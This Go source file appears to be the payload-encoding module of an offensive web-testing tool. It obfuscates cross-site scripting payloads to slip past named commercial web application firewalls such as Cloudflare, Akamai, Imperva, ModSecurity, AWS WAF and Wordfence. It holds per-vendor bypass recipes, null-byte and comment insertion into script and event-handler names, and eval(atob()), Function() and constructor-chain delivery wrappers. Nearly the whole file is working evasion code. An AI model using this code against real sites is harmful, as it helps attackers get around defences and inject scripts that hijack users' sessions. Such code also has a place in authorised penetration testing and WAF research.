// Package waf provides WAF detection and bypass capabilities
package waf

import (
	"encoding/base64"
	"fmt"
	"net/url"
	"strings"
	"unicode/utf8"
)

// EncodingType represents an encoding strategy
type EncodingType int

const (
	EncodingNone EncodingType = iota
	EncodingURL
	EncodingDoubleURL
	EncodingHTML
	EncodingHTMLHex
	EncodingHTMLDecimal
	EncodingUnicode
	EncodingUnicodeShort
	EncodingBase64
	EncodingHex
	EncodingOctal
	EncodingMixed
	EncodingNull
	EncodingCase
	EncodingComment
	EncodingWhitespace
)

// EncodingLevel represents aggressiveness of encoding (1-5)
type EncodingLevel int

const (
	EncodingLevelMinimal   EncodingLevel = 1
	EncodingLevelLight     EncodingLevel = 2
	EncodingLevelModerate  EncodingLevel = 3
	EncodingLevelAggessive EncodingLevel = 4
	EncodingLevelMaximum   EncodingLevel = 5
)

// Encoder provides encoding and obfuscation for WAF bypass
type Encoder struct {
	level EncodingLevel
}

// NewEncoder creates a new encoder
func NewEncoder() *Encoder {
	return &Encoder{
		level: EncodingLevelModerate,
	}
}

// SetLevel sets the encoding aggressiveness level
func (e *Encoder) SetLevel(level EncodingLevel) {
	e.level = level
}

// Encode applies encoding based on WAF type
func (e *Encoder) Encode(payload string, wafType WAFType, encodings ...EncodingType) string {
	if len(encodings) == 0 {
		encodings = e.getRecommendedEncodings(wafType)
	}

	result := payload
	for _, encoding := range encodings {
		result = e.applyEncoding(result, encoding)
	}

	return result
}

// EncodeForContext applies context-specific encoding
func (e *Encoder) EncodeForContext(payload string, context string) string {
	switch context {
	case "html":
		return e.HTMLEncode(payload)
	case "attribute":
		return e.AttributeEncode(payload)
	case "javascript":
		return e.JavaScriptEncode(payload)
	case "url":
		return e.URLEncode(payload)
	case "css":
		return e.CSSEncode(payload)
	default:
		return payload
	}
}

// getRecommendedEncodings returns encoding strategies based on WAF type
func (e *Encoder) getRecommendedEncodings(wafType WAFType) []EncodingType {
	strategies := map[WAFType][]EncodingType{
		WAFCloudflare: {EncodingUnicode, EncodingURL},
		WAFAkamai:     {EncodingDoubleURL, EncodingCase},
		WAFKona:       {EncodingDoubleURL, EncodingComment},
		WAFImperva:    {EncodingWhitespace, EncodingHTMLHex},
		WAFIncapsula:  {EncodingUnicode, EncodingCase},
		WAFModSecurity: {EncodingComment, EncodingCase, EncodingNull},
		WAFAFW:        {EncodingDoubleURL, EncodingMixed},
		WAFSuccuri:    {EncodingUnicode, EncodingCase},
		WAFBarracuda:  {EncodingURL, EncodingCase},
		WAFCitrix:     {EncodingDoubleURL, EncodingWhitespace},
		WAFNginx:      {EncodingURL, EncodingUnicode},
		WAFStackPath:  {EncodingURL, EncodingComment},
		WAFBIG_IP_ASM: {EncodingDoubleURL, EncodingCase},
		WAFFortiWeb:   {EncodingURL, EncodingUnicode},
		WAFRadware:    {EncodingDoubleURL, EncodingComment},
		WAFWordfence:  {EncodingURL, EncodingWhitespace},
	}

	if enc, ok := strategies[wafType]; ok {
		return enc
	}
	return []EncodingType{EncodingURL}
}

// applyEncoding applies a single encoding type
func (e *Encoder) applyEncoding(payload string, encoding EncodingType) string {
	switch encoding {
	case EncodingURL:
		return e.URLEncode(payload)
	case EncodingDoubleURL:
		return e.DoubleURLEncode(payload)
	case EncodingHTML:
		return e.HTMLEncode(payload)
	case EncodingHTMLHex:
		return e.HTMLHexEncode(payload)
	case EncodingHTMLDecimal:
		return e.HTMLDecimalEncode(payload)
	case EncodingUnicode:
		return e.UnicodeEncode(payload)
	case EncodingUnicodeShort:
		return e.UnicodeShortEncode(payload)
	case EncodingBase64:
		return e.Base64Encode(payload)
	case EncodingHex:
		return e.HexEncode(payload)
	case EncodingOctal:
		return e.OctalEncode(payload)
	case EncodingMixed:
		return e.MixedEncode(payload)
	case EncodingNull:
		return e.NullByteInject(payload)
	case EncodingCase:
		return e.CaseVariation(payload)
	case EncodingComment:
		return e.CommentInsertion(payload)
	case EncodingWhitespace:
		return e.WhitespaceInsertion(payload)
	default:
		return payload
	}
}

// URLEncode performs URL encoding
func (e *Encoder) URLEncode(payload string) string {
	return url.QueryEscape(payload)
}

// DoubleURLEncode performs double URL encoding
func (e *Encoder) DoubleURLEncode(payload string) string {
	return url.QueryEscape(url.QueryEscape(payload))
}

// HTMLEncode performs HTML entity encoding
func (e *Encoder) HTMLEncode(payload string) string {
	replacer := strings.NewReplacer(
		"<", "&lt;",
		">", "&gt;",
		"&", "&amp;",
		"\"", "&quot;",
		"'", "&#39;",
	)
	return replacer.Replace(payload)
}

// HTMLHexEncode encodes characters as hex HTML entities
func (e *Encoder) HTMLHexEncode(payload string) string {
	var result strings.Builder
	for _, r := range payload {
		if r < 128 && (r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9') {
			result.WriteRune(r)
		} else {
			result.WriteString(fmt.Sprintf("&#x%x;", r))
		}
	}
	return result.String()
}

// HTMLDecimalEncode encodes characters as decimal HTML entities
func (e *Encoder) HTMLDecimalEncode(payload string) string {
	var result strings.Builder
	for _, r := range payload {
		if r < 128 && (r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9') {
			result.WriteRune(r)
		} else {
			result.WriteString(fmt.Sprintf("&#%d;", r))
		}
	}
	return result.String()
}

// UnicodeEncode performs JavaScript Unicode encoding (\uXXXX)
func (e *Encoder) UnicodeEncode(payload string) string {
	var result strings.Builder
	for _, r := range payload {
		if r < 128 && (r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9') {
			result.WriteRune(r)
		} else {
			result.WriteString(fmt.Sprintf("\\u%04x", r))
		}
	}
	return result.String()
}

// UnicodeShortEncode performs short Unicode encoding (\xXX)
func (e *Encoder) UnicodeShortEncode(payload string) string {
	var result strings.Builder
	for _, r := range payload {
		if r < 128 && (r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9') {
			result.WriteRune(r)
		} else if r < 256 {
			result.WriteString(fmt.Sprintf("\\x%02x", r))
		} else {
			result.WriteString(fmt.Sprintf("\\u%04x", r))
		}
	}
	return result.String()
}

// Base64Encode encodes the payload in base64
func (e *Encoder) Base64Encode(payload string) string {
	return base64.StdEncoding.EncodeToString([]byte(payload))
}

// HexEncode encodes the payload in hex
func (e *Encoder) HexEncode(payload string) string {
	var result strings.Builder
	for _, b := range []byte(payload) {
		result.WriteString(fmt.Sprintf("\\x%02x", b))
	}
	return result.String()
}

// OctalEncode encodes the payload in octal
func (e *Encoder) OctalEncode(payload string) string {
	var result strings.Builder
	for _, b := range []byte(payload) {
		result.WriteString(fmt.Sprintf("\\%03o", b))
	}
	return result.String()
}

// MixedEncode applies mixed encoding (different encoding per character)
func (e *Encoder) MixedEncode(payload string) string {
	var result strings.Builder
	encodings := []func(rune) string{
		func(r rune) string { return string(r) },                                // plain
		func(r rune) string { return fmt.Sprintf("&#%d;", r) },                  // decimal
		func(r rune) string { return fmt.Sprintf("&#x%x;", r) },                 // hex
		func(r rune) string { return url.QueryEscape(string(r)) },               // URL
	}

	i := 0
	for _, r := range payload {
		encoder := encodings[i%len(encodings)]
		result.WriteString(encoder(r))
		i++
	}
	return result.String()
}

// NullByteInject injects null bytes into the payload
func (e *Encoder) NullByteInject(payload string) string {
	// Insert null bytes in tag names and attributes
	result := strings.Replace(payload, "script", "scr\x00ipt", -1)
	result = strings.Replace(result, "img", "im\x00g", -1)
	result = strings.Replace(result, "svg", "sv\x00g", -1)
	result = strings.Replace(result, "onerror", "on\x00error", -1)
	result = strings.Replace(result, "onload", "on\x00load", -1)
	result = strings.Replace(result, "onclick", "on\x00click", -1)
	return result
}

// CaseVariation applies random case variation to the payload
func (e *Encoder) CaseVariation(payload string) string {
	var result strings.Builder
	upper := true
	for _, r := range payload {
		if r >= 'a' && r <= 'z' {
			if upper {
				result.WriteRune(r - 32) // Convert to uppercase
			} else {
				result.WriteRune(r)
			}
			upper = !upper
		} else if r >= 'A' && r <= 'Z' {
			if !upper {
				result.WriteRune(r + 32) // Convert to lowercase
			} else {
				result.WriteRune(r)
			}
			upper = !upper
		} else {
			result.WriteRune(r)
		}
	}
	return result.String()
}

// CommentInsertion inserts comments into JavaScript
func (e *Encoder) CommentInsertion(payload string) string {
	// Insert comments before and after function calls
	result := strings.Replace(payload, "alert(", "/**/alert/*comment*/(", -1)
	result = strings.Replace(result, "eval(", "/**/eval/*comment*/(", -1)
	result = strings.Replace(result, "prompt(", "/**/prompt/*comment*/(", -1)
	result = strings.Replace(result, "confirm(", "/**/confirm/*comment*/(", -1)
	return result
}

// WhitespaceInsertion inserts various whitespace characters
func (e *Encoder) WhitespaceInsertion(payload string) string {
	// Replace spaces with alternative whitespace
	whitespace := []string{"\t", "\n", "\r", "\f", "\v", " "}
	result := payload

	// Insert whitespace after < in tags
	result = strings.Replace(result, "<script", "<script\t", 1)
	result = strings.Replace(result, "<img", "<img\n", 1)
	result = strings.Replace(result, "<svg", "<svg\t", 1)

	// Replace some spaces with tabs
	count := 0
	var builder strings.Builder
	for _, r := range result {
		if r == ' ' {
			ws := whitespace[count%len(whitespace)]
			builder.WriteString(ws)
			count++
		} else {
			builder.WriteRune(r)
		}
	}
	return builder.String()
}

// JavaScriptEncode encodes for JavaScript string context
func (e *Encoder) JavaScriptEncode(payload string) string {
	var result strings.Builder
	for _, r := range payload {
		switch r {
		case '\\':
			result.WriteString("\\\\")
		case '\'':
			result.WriteString("\\'")
		case '"':
			result.WriteString("\\\"")
		case '\n':
			result.WriteString("\\n")
		case '\r':
			result.WriteString("\\r")
		case '\t':
			result.WriteString("\\t")
		case '<':
			result.WriteString("\\x3c")
		case '>':
			result.WriteString("\\x3e")
		default:
			if r < 32 || r > 126 {
				result.WriteString(fmt.Sprintf("\\u%04x", r))
			} else {
				result.WriteRune(r)
			}
		}
	}
	return result.String()
}

// AttributeEncode encodes for HTML attribute context
func (e *Encoder) AttributeEncode(payload string) string {
	var result strings.Builder
	for _, r := range payload {
		switch r {
		case '&':
			result.WriteString("&amp;")
		case '<':
			result.WriteString("&lt;")
		case '>':
			result.WriteString("&gt;")
		case '"':
			result.WriteString("&quot;")
		case '\'':
			result.WriteString("&#39;")
		default:
			if r < 32 || r > 126 {
				result.WriteString(fmt.Sprintf("&#x%x;", r))
			} else {
				result.WriteRune(r)
			}
		}
	}
	return result.String()
}

// CSSEncode encodes for CSS context
func (e *Encoder) CSSEncode(payload string) string {
	var result strings.Builder
	for _, r := range payload {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') {
			result.WriteRune(r)
		} else {
			result.WriteString(fmt.Sprintf("\\%x ", r))
		}
	}
	return result.String()
}

// GenerateVariants generates multiple encoded variants of a payload
func (e *Encoder) GenerateVariants(payload string, wafType WAFType) []string {
	variants := []string{payload} // Original

	// Apply recommended encodings
	recommended := e.getRecommendedEncodings(wafType)
	for _, enc := range recommended {
		variants = append(variants, e.applyEncoding(payload, enc))
	}

	// Add common bypass variants based on encoding level
	if e.level >= EncodingLevelLight {
		variants = append(variants,
			e.CaseVariation(payload),
			e.URLEncode(payload),
		)
	}

	if e.level >= EncodingLevelModerate {
		variants = append(variants,
			e.DoubleURLEncode(payload),
			e.HTMLHexEncode(payload),
			e.CommentInsertion(payload),
		)
	}

	if e.level >= EncodingLevelAggessive {
		variants = append(variants,
			e.UnicodeEncode(payload),
			e.NullByteInject(payload),
			e.WhitespaceInsertion(payload),
			e.MixedEncode(payload),
		)
	}

	if e.level >= EncodingLevelMaximum {
		// Combine multiple encodings
		variants = append(variants,
			e.DoubleURLEncode(e.CaseVariation(payload)),
			e.HTMLHexEncode(e.WhitespaceInsertion(payload)),
			e.UnicodeEncode(e.CommentInsertion(payload)),
		)
	}

	return removeDuplicates(variants)
}

// removeDuplicates removes duplicate strings from a slice
func removeDuplicates(s []string) []string {
	seen := make(map[string]bool)
	var result []string
	for _, v := range s {
		if !seen[v] {
			seen[v] = true
			result = append(result, v)
		}
	}
	return result
}

// DecodePayload attempts to decode an encoded payload
func (e *Encoder) DecodePayload(payload string) string {
	// Try URL decoding
	decoded, err := url.QueryUnescape(payload)
	if err == nil && decoded != payload {
		payload = decoded
		// Try double decoding
		decoded2, err := url.QueryUnescape(payload)
		if err == nil && decoded2 != payload {
			payload = decoded2
		}
	}

	// Decode HTML entities
	payload = decodeHTMLEntities(payload)

	return payload
}

// decodeHTMLEntities decodes common HTML entities
func decodeHTMLEntities(s string) string {
	replacer := strings.NewReplacer(
		"&lt;", "<",
		"&gt;", ">",
		"&amp;", "&",
		"&quot;", "\"",
		"&#39;", "'",
		"&#x27;", "'",
		"&#x3c;", "<",
		"&#x3e;", ">",
		"&#60;", "<",
		"&#62;", ">",
	)
	return replacer.Replace(s)
}

// GetPayloadWithDelivery wraps payload in various delivery methods
func (e *Encoder) GetPayloadWithDelivery(payload string) []string {
	// Get the JavaScript alert or expression from the payload
	// and wrap it in different delivery mechanisms
	return []string{
		payload,
		fmt.Sprintf("eval(%s)", e.Base64Wrap(payload)),
		fmt.Sprintf("setTimeout(%s)", e.QuoteWrap(payload)),
		fmt.Sprintf("setInterval(%s,1)", e.QuoteWrap(payload)),
		fmt.Sprintf("[].constructor.constructor(%s)()", e.QuoteWrap(payload)),
		fmt.Sprintf("Function(%s)()", e.QuoteWrap(payload)),
		fmt.Sprintf("window['eval'](%s)", e.QuoteWrap(payload)),
		fmt.Sprintf("top['alert'](1)"),
		fmt.Sprintf("self['alert'](1)"),
		fmt.Sprintf("parent['alert'](1)"),
	}
}

// Base64Wrap wraps a payload for base64 eval
func (e *Encoder) Base64Wrap(payload string) string {
	return fmt.Sprintf("atob('%s')", e.Base64Encode(payload))
}

// QuoteWrap wraps a payload in quotes
func (e *Encoder) QuoteWrap(payload string) string {
	return fmt.Sprintf("'%s'", strings.Replace(payload, "'", "\\'", -1))
}

// CharCodeWrap wraps payload using String.fromCharCode
func (e *Encoder) CharCodeWrap(payload string) string {
	var codes []string
	for _, r := range payload {
		codes = append(codes, fmt.Sprintf("%d", r))
	}
	return fmt.Sprintf("String.fromCharCode(%s)", strings.Join(codes, ","))
}

// GetBypassPayload generates a WAF-specific bypass payload
func (e *Encoder) GetBypassPayload(basePayload string, wafType WAFType) string {
	switch wafType {
	case WAFCloudflare:
		// Cloudflare bypass: use unicode and template literals
		return e.UnicodeEncode(strings.Replace(basePayload, "(1)", "`1`", 1))

	case WAFAkamai, WAFKona:
		// Akamai bypass: double URL encode and use comments
		return e.DoubleURLEncode(e.CommentInsertion(basePayload))

	case WAFImperva, WAFIncapsula:
		// Imperva bypass: mixed encoding and whitespace
		return e.MixedEncode(e.WhitespaceInsertion(basePayload))

	case WAFModSecurity:
		// ModSecurity bypass: null bytes and case variation
		return e.NullByteInject(e.CaseVariation(basePayload))

	case WAFAFW:
		// AWS WAF bypass: double encoding
		return e.DoubleURLEncode(basePayload)

	case WAFWordfence:
		// Wordfence bypass: whitespace and URL encoding
		return e.URLEncode(e.WhitespaceInsertion(basePayload))

	default:
		return e.CaseVariation(basePayload)
	}
}

// String returns a string representation of the encoding type
func (et EncodingType) String() string {
	names := map[EncodingType]string{
		EncodingNone:         "none",
		EncodingURL:          "url",
		EncodingDoubleURL:    "double-url",
		EncodingHTML:         "html",
		EncodingHTMLHex:      "html-hex",
		EncodingHTMLDecimal:  "html-decimal",
		EncodingUnicode:      "unicode",
		EncodingUnicodeShort: "unicode-short",
		EncodingBase64:       "base64",
		EncodingHex:          "hex",
		EncodingOctal:        "octal",
		EncodingMixed:        "mixed",
		EncodingNull:         "null-byte",
		EncodingCase:         "case-variation",
		EncodingComment:      "comment-insertion",
		EncodingWhitespace:   "whitespace",
	}
	if name, ok := names[et]; ok {
		return name
	}
	return "unknown"
}

// ByteLength returns the byte length of a string (for Content-Length)
func ByteLength(s string) int {
	return utf8.RuneCountInString(s)
}
